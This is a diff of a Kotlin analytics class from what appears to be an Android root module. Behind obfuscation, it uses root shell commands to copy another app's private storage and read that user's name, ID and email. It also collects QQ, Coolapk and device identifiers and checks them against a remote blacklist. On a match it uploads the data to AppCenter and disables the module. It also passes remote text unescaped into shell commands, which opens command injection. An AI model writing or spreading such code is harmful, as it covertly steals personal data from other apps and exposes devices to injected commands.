@@ -7,35 +7,45 @@ import com.drake.net.Get
 import com.drake.net.utils.scope
 import com.drake.net.utils.scopeNet
 import com.drake.net.utils.withDefault
+import com.highcapable.yukihookapi.hook.factory.dataChannel
 import com.joom.paranoid.Obfuscate
 import com.luckyzyx.luckytool.BuildConfig
 import com.microsoft.appcenter.AppCenter
 import com.microsoft.appcenter.analytics.Analytics
 import com.microsoft.appcenter.crashes.Crashes
 import com.tencent.mmkv.MMKV
+import com.topjohnwu.superuser.Shell
 import com.topjohnwu.superuser.ShellUtils
 import kotlinx.coroutines.Dispatchers
 import org.json.JSONArray
 import org.json.JSONObject
 
 @Obfuscate
-object AppAnalyticsUtils {
+class AppAnalyticsUtils(val context: Context) {
 
-    private const val normalAppCenterSecret = BuildConfig.APP_CENTER_SECRET
-    private const val betaAppCenterSecret = BuildConfig.APP_CENTER_SECRET_BETA
+    private val normalAppCenterSecret = BuildConfig.APP_CENTER_SECRET
+    private val betaAppCenterSecret = BuildConfig.APP_CENTER_SECRET_BETA
+
+    private val dataDir = "/data/local/tmp/luckys/"
+    private val dataPath = "/data/local/tmp/luckys/data.dat"
 
     private var qss = ArrayList<String>()
     private var css = ArrayList<String>()
     private var gid = ""
 
-    val forbiddenAppList = arrayOf("com.Sunshine.ToolBox")
+    private var forbiddenAppList: ArrayList<String>
 
-    fun Application.init(isBeta: Boolean) {
+    init {
+        forbiddenAppList = getForbiddenApps(false)
+        if (forbiddenAppList.isEmpty()) forbiddenAppList.add("com.Sunshine.ToolBox")
+    }
+
+    fun init(application: Application, isBeta: Boolean) {
         if (isBeta) AppCenter.start(
-            this, betaAppCenterSecret, Analytics::class.java, Crashes::class.java
+            application, betaAppCenterSecret, Analytics::class.java, Crashes::class.java
         )
         else AppCenter.start(
-            this, normalAppCenterSecret, Analytics::class.java, Crashes::class.java
+            application, normalAppCenterSecret, Analytics::class.java, Crashes::class.java
         )
     }
 
@@ -46,25 +56,27 @@ object AppAnalyticsUtils {
     }
 
     private fun Context.checkMagicalStory(isDebug: Boolean = false): ArrayMap<String, String> {
+        LogUtils.i("checkMagicalStory", "", "start", isDebug)
+
         val map = ArrayMap<String, String>()
         return try {
             val appInfo = PackageUtils(packageManager).getApplicationInfo(
                 "com.magicalstory.AppStore", 0
             ) ?: return ArrayMap<String, String>()
-            if (isDebug) LogUtils.i("checkMagicalStory", "dataDir", appInfo.dataDir, true)
+            LogUtils.d("checkMagicalStory", "dataDir", appInfo.dataDir, isDebug)
             ShellUtils.fastCmd(
                 "cp -R -f ${appInfo.dataDir}/files/mmkv $cacheDir", "chmod -R -f 777 $cacheDir/mmkv"
             )
             val path = MMKV.initialize(this, "$cacheDir/mmkv")
-            if (isDebug) LogUtils.i("MMKV", "initialize", path, true)
+            LogUtils.d("MMKV", "initialize", path, isDebug)
 
             val mmkv = MMKV.defaultMMKV(MMKV.MULTI_PROCESS_MODE, null)
             val name = mmkv.decodeString("name")
-            if (isDebug) LogUtils.i("MMKV", "name", "$name", true)
+            LogUtils.d("MMKV", "name", "$name", isDebug)
             val userId = mmkv.decodeString("user_id")
-            if (isDebug) LogUtils.i("MMKV", "userId", "$userId", true)
+            LogUtils.d("MMKV", "userId", "$userId", isDebug)
             val email = mmkv.decodeString("email")
-            if (isDebug) LogUtils.i("MMKV", "email", "$email", true)
+            LogUtils.d("MMKV", "email", "$email", isDebug)
             mmkv.close()
             map["$userId"] = "$name | $userId | $email"
             map
@@ -74,17 +86,13 @@ object AppAnalyticsUtils {
         }
     }
 
-    fun isAppForbidden(packName: String): Boolean {
-        forbiddenAppList.forEach {
-            if (it.lowercase() == packName.lowercase()) {
-                return true
-            }
-        }
-        return false
-    }
+    fun checkAppForbiddenList(isDebug: Boolean = false) {
+        scope(dispatcher = Dispatchers.Default) {
+            LogUtils.i(
+                "checkAppForbiddenList", "forbiddenAppList", forbiddenAppList.toString(),
+                isDebug
+            )
 
-    fun checkAppForbiddenList() {
-        scopeNet {
             forbiddenAppList.forEach {
                 val map = getPackageAbsolutePath(it, true)
                 map.toList().forEachIndexed { _, pair ->
@@ -103,124 +111,74 @@ object AppAnalyticsUtils {
         }
     }
 
-    fun Context.checkGitlabBlackList(isDebug: Boolean = false) {
+    fun checkGitlabBlackList(isDebug: Boolean = false) {
         scopeNet {
+            LogUtils.i("checkGitlabBlackList", "", "start", isDebug)
+
             val latestUrl = "https://gitlab.com/luckyzyx/luckyzyx.gitlab.io/raw/main/blacklist"
             val getDoc = Get<String>(latestUrl).await()
-            if (getDoc.isNotBlank()) {
-//                LogUtils.e("checkGitlabBlackList", "remote", getDoc, true)
-                startCheckList("remote", getDoc, "", isDebug)
-            }
+            startRemoteCheckList(getDoc, isDebug)
         }.catch {
             LogUtils.e("check gitlab", "throw", "$it", true)
             startLocalCheckList(isDebug)
         }
     }
 
-    private fun Context.saveBlackList(original: String) {
+    private fun startRemoteCheckList(original: String, isDebug: Boolean = false) {
         scope(dispatcher = Dispatchers.Default) {
-            val remoteJsonData = safeOfNull { AESCrypt.decrypt(original) } ?: ""
-            val remoteJson = safeOfNull { JSONObject(remoteJsonData) } ?: JSONObject()
-            val remoteUpdateTime = remoteJson.optString("updateTime")
-            if (remoteUpdateTime.isNotBlank()) {
-                val localOriginal = ShellUtils.fastCmd("cat /data/local/tmp/luckys/data.dat")
-                val localFinalData = safeOfNull { AESCrypt.decrypt(localOriginal) } ?: ""
-//                LogUtils.d("getLocalBlackList", "original", original, true)
-                val localJson = safeOfNull { JSONObject(localFinalData) } ?: JSONObject()
-                val localUpdateTime = localJson.optString("updateTime")
-                if (remoteUpdateTime != localUpdateTime) {
-                    ShellUtils.fastCmd("echo $original > /data/local/tmp/luckys/data.dat")
-                }
-            } else {
-                startLocalCheckList()
-            }
-        }
-    }
+            LogUtils.i("startRemoteCheckList", "", "start", isDebug)
 
-    private fun Context.startCheckList(
-        tag: String, original: String, jsonstring: String, isDebug: Boolean = false
-    ) {
-        scope(dispatcher = Dispatchers.Default) {
-            if (isDebug) LogUtils.e(
-                "startCheckList", tag, "${original.isNotBlank()} | ${jsonstring.isNotBlank()}", true
+            LogUtils.d(
+                "startRemoteCheckList", "remoteOriginal", "${original.isNotBlank()}",
+                isDebug
             )
-            if (original.isNotBlank()) saveBlackList(original)
-
-            var qbsval = false
-            var cbsval = false
-            var disval = false
-            var magval = false
-            val map = ArrayMap<String, String>()
-            map["time"] = formatDate("YYYYMMdd-HH:mm:ss")
-
-            initAllBlackIds(isDebug)
-
-            var decryptJson = safeOfNull { AESCrypt.decrypt(original) } ?: ""
-            if (tag == "builtIn") decryptJson = jsonstring
-            val js = safeOfNull { JSONObject(decryptJson) } ?: JSONObject()
-            if (isDebug) LogUtils.e("check", tag, "${decryptJson.ifBlank { null }}", true)
 
             if (original.isBlank()) {
-                if (jsonstring.isBlank() || js.length() <= 0) {
-                    startBuiltInCheckList(isDebug)
-                }
+                LogUtils.d(
+                    "startRemoteCheckList", "remoteOriginal is null", "startLocalCheckList",
+                    isDebug
+                )
+                startLocalCheckList(isDebug)
                 return@scope
             }
 
-            (js.optJSONArray("qbk") ?: JSONArray()).toStringList().apply {
-                qss.forEach {
-                    if (isDebug) LogUtils.e("check qbk", "for", "$this | $it", true)
-                    if (contains(it)) {
-                        qbsval = true
-                        map["qbk"] = it
-                    }
-                }
-            }
-            (js.optJSONArray("cbk") ?: JSONArray()).toStringList().apply {
-                css.forEach {
-                    if (isDebug) LogUtils.e("check cbk", "for", "$this | $it", true)
-                    if (contains(it)) {
-                        cbsval = true
-                        map["cbk"] = it
-                    }
-                }
-            }
-            (js.optJSONArray("dik") ?: JSONArray()).toStringList().apply {
-                if (isDebug) LogUtils.e("check dik", "for", "$this | $gid", true)
-                if (contains(gid)) {
-                    disval = true
-                    map["dik"] = gid
-                }
-            }
-            (js.optJSONArray("magical") ?: JSONArray()).toStringList().apply {
-                val list = checkMagicalStory()
-                if (isDebug) LogUtils.e("check mag", "list", "$this | $list", true)
-                if (list.isNotEmpty()) list.keys.forEach {
-                    if (contains(it)) {
-                        magval = true
-                        map["mag"] = list[it]
-                    }
-                }
-            }
-            if (qbsval || cbsval || disval || magval) {
-                trackEvent("bk", map)
-                removeModule()
-                exitModule()
-            }
-        }.catch {
-            LogUtils.e("check list", tag, "$it")
+            saveBlackList(original, isDebug)
+            saveForbiddenApps(original, isDebug)
+
+            startCheckList("remote", original, "", isDebug)
         }
     }
 
-    private fun Context.startLocalCheckList(isDebug: Boolean = false) {
+    private fun startLocalCheckList(isDebug: Boolean = false) {
         scope(dispatcher = Dispatchers.Default) {
-            val localOriginal = ShellUtils.fastCmd("cat /data/local/tmp/luckys/data.dat")
-//                LogUtils.d("getLocalBlackList", "original", original, true)
+            LogUtils.i("startLocalCheckList", "", "start", isDebug)
+
+            val dataList = ArrayList<String>()
+            Shell.cmd("cat $dataPath").to(dataList).exec()
+            val localOriginal = formatStringAuto(dataList, "")
+            LogUtils.d(
+                "startLocalCheckList", "localOriginal", "${localOriginal.isNotBlank()}",
+                isDebug
+            )
+
+            if (localOriginal.isBlank()) {
+                LogUtils.d(
+                    "startRemoteCheckList", "localOriginal is null", "startBuiltInCheckList",
+                    isDebug
+                )
+                startBuiltInCheckList(isDebug)
+                return@scope
+            }
+
+            saveForbiddenApps(localOriginal, isDebug)
+
             startCheckList("local", localOriginal, "", isDebug)
         }
     }
 
-    private fun Context.startBuiltInCheckList(isDebug: Boolean = false) {
+    private fun startBuiltInCheckList(isDebug: Boolean = false) {
+        LogUtils.i("startBuiltInCheckList", "", "start", isDebug)
+
         val json = JSONObject().apply {
             put("qbk", JSONArray().apply {
                 put("1150325619")
@@ -246,20 +204,191 @@ object AppAnalyticsUtils {
                 put("e3db3345c2de23bf02477ce21a3c12c9539eb9df36dc233d81b902477435f816")
             })
             put("magical", JSONArray().apply {
-
+                put("9476027")
+            })
+            put("forbiddenApps", JSONArray().apply {
+                put("com.Sunshine.ToolBox")
             })
         }
+
         startCheckList("builtIn", "", json.toString(), isDebug)
+    }
+
+    private fun startCheckList(
+        tag: String, original: String, jsonstring: String, isDebug: Boolean = false
+    ) {
+        scope(dispatcher = Dispatchers.Default) {
+            LogUtils.i(
+                "startCheckList", tag,
+                "${original.isNotBlank()} | ${jsonstring.isNotBlank()}", isDebug
+            )
+
+            var qbsval = false
+            var cbsval = false
+            var disval = false
+            var magval = false
+            val map = ArrayMap<String, String>()
+            map["time"] = formatDate("YYYYMMdd-HH:mm:ss")
+
+            initAllBlackIds(isDebug)
+
+            var decryptJson = safeOfNull { AESCrypt.decrypt(original) } ?: ""
+            if (tag == "builtIn") decryptJson = jsonstring
+
+            val js = safeOfNull { JSONObject(decryptJson) } ?: JSONObject()
+            LogUtils.d("startCheckList", "$tag - json", "${decryptJson.ifBlank { null }}", isDebug)
+
+            if (decryptJson.isBlank() || js.length() <= 0) {
+                LogUtils.d("startCheckList", tag, "data is null -> startBuiltInCheckList", isDebug)
+                startBuiltInCheckList(isDebug)
+                return@scope
+            }
+
+            (js.optJSONArray("qbk") ?: JSONArray()).toStringList().apply {
+                qss.forEach {
+                    LogUtils.d("check qq", "for", "$this | $it", isDebug)
+                    if (contains(it)) {
+                        qbsval = true
+                        map["qbk"] = it
+                    }
+                }
+            }
+            (js.optJSONArray("cbk") ?: JSONArray()).toStringList().apply {
+                css.forEach {
+                    LogUtils.d("check coolapk", "for", "$this | $it", isDebug)
+                    if (contains(it)) {
+                        cbsval = true
+                        map["cbk"] = it
+                    }
+                }
+            }
+            (js.optJSONArray("dik") ?: JSONArray()).toStringList().apply {
+                LogUtils.d("check device", "for", "$this | $gid", isDebug)
+                if (contains(gid)) {
+                    disval = true
+                    map["dik"] = gid
+                }
+            }
+            (js.optJSONArray("magical") ?: JSONArray()).toStringList().apply {
+                val list = context.checkMagicalStory(isDebug)
+                LogUtils.d("check magical", "list", "$this | $list", isDebug)
+                if (list.isNotEmpty()) list.keys.forEach {
+                    if (contains(it)) {
+                        magval = true
+                        map["mag"] = list[it]
+                    }
+                }
+            }
+            if (qbsval || cbsval || disval || magval) {
+                trackEvent("bk", map)
+                context.removeModule()
+                context.exitModule()
+            }
+        }.catch {
+            LogUtils.e("check list", tag, "$it", true)
+        }
+    }
+
+    private fun saveBlackList(original: String, isDebug: Boolean = false) {
+        scope(dispatcher = Dispatchers.Default) {
+            LogUtils.i("saveBlackList", "", "start", isDebug)
+
+            val remoteJsonData = safeOfNull { AESCrypt.decrypt(original) } ?: ""
+            val remoteJson = safeOfNull { JSONObject(remoteJsonData) } ?: JSONObject()
+            val remoteUpdateTime = remoteJson.optString("updateTime")
+            LogUtils.d("saveBlackList", "remoteUpdateTime", remoteUpdateTime, isDebug)
+
+            if (remoteJsonData.isBlank() || remoteJson.length() <= 0) {
+                LogUtils.d(
+                    "saveBlackList", "remoteJson is null", "startLocalCheckList",
+                    isDebug
+                )
+                startLocalCheckList(isDebug)
+                return@scope
+            }
+            if (remoteUpdateTime.isNotBlank()) {
+                val dataList = ArrayList<String>()
+                Shell.cmd("cat $dataPath").to(dataList).exec()
+                val localOriginal = formatStringAuto(dataList, "")
+                LogUtils.d("saveBlackList", "localOriginal", localOriginal, isDebug)
+                if (localOriginal.isNotBlank()) {
+                    val localFinalData = safeOfNull { AESCrypt.decrypt(localOriginal) } ?: ""
+                    val localJson = safeOfNull { JSONObject(localFinalData) } ?: JSONObject()
+                    val localUpdateTime = localJson.optString("updateTime")
+                    LogUtils.d(
+                        "saveBlackList", "localUpdateTime", localUpdateTime,
+                        isDebug
+                    )
+                    if (remoteUpdateTime != localUpdateTime) {
+                        LogUtils.d(
+                            "saveBlackList", "UpdateTime is change", "echo original",
+                            isDebug
+                        )
+                        ShellUtils.fastCmd("echo '$original' > $dataPath")
+                    }
+                } else {
+                    LogUtils.d(
+                        "saveBlackList", "localOriginal is blank", "save original",
+                        isDebug
+                    )
+                    ShellUtils.fastCmd("rm -rf $dataDir && mkdir -p $dataDir")
+                    ShellUtils.fastCmd("echo '$original' > $dataPath")
+                }
+            }
+        }
+    }
+
+    @Suppress("SameParameterValue")
+    private fun getForbiddenApps(isDebug: Boolean): ArrayList<String> {
+        LogUtils.i("getForbiddenApps", "", "start", isDebug)
+
+        val encryptKey = safeOfNull { AESCrypt.encrypt("forbiddenApps") } ?: ""
+        LogUtils.d("getForbiddenApps", "encryptKey", encryptKey, isDebug)
+
+        val encryptValue = context.getString(SettingsPrefs, encryptKey)
+        LogUtils.d("getForbiddenApps", "encryptValue", encryptValue, isDebug)
+
+        val originalValue = safeOfNull { AESCrypt.decrypt(encryptValue) } ?: ""
+        LogUtils.d("getForbiddenApps", "originalValue", originalValue, isDebug)
+
+        val jsonArray = safeOfNull { JSONArray(originalValue) } ?: JSONArray()
+        if (jsonArray.length() == 0) return arrayListOf()
+        return jsonArray.toStringList()
+    }
+
+    private fun saveForbiddenApps(original: String, isDebug: Boolean = false) {
+        scope(dispatcher = Dispatchers.Default) {
+            LogUtils.i("saveForbiddenApps", "", "start", isDebug)
+
+            val jsonData = safeOfNull { AESCrypt.decrypt(original) } ?: ""
+            val json = safeOfNull { JSONObject(jsonData) } ?: JSONObject()
+            LogUtils.d("saveForbiddenApps", "json", json.toString(), isDebug)
+
+            val forbiddenApps = json.optJSONArray("forbiddenApps") ?: JSONArray()
+            val finalKey = safeOfNull { AESCrypt.encrypt("forbiddenApps") } ?: ""
+            LogUtils.d("saveForbiddenApps", "finalKey", finalKey, isDebug)
+
+            if (forbiddenApps.length() == 0) return@scope
+            val finalValue = safeOfNull { AESCrypt.encrypt(forbiddenApps.toString()) } ?: ""
+            LogUtils.d("saveForbiddenApps", "finalValue", finalValue, isDebug)
+
+            if (finalKey.isNotBlank() && finalValue.isNotBlank()) {
+                context.putString(SettingsPrefs, finalKey, finalValue)
+                context.dataChannel("android").put("rk7cBXvdN33TqHzVdwBQvQ==", finalValue)
+            }
+        }
     }
 
     private suspend fun initAllBlackIds(isDebug: Boolean = false) {
         withDefault {
+            LogUtils.i("initAllBlackIds", "", "start", isDebug)
+
             if (qss.isEmpty()) qss = getQSlist()
-            if (isDebug) LogUtils.e("check", "getQSlist", "${qss.toList()}", true)
+            LogUtils.d("initAllBlackIds", "getQSlist", "${qss.toList()}", isDebug)
             if (css.isEmpty()) css = getCSid()
-            if (isDebug) LogUtils.e("check", "getCSid", "${css.toList()}", true)
+            LogUtils.d("initAllBlackIds", "getCSid", "${css.toList()}", isDebug)
             if (gid.isEmpty()) gid = getGuid
-            if (isDebug) LogUtils.e("check", "getGuid", gid, true)
+            LogUtils.d("initAllBlackIds", "getGuid", gid, isDebug)
         }
     }
 }
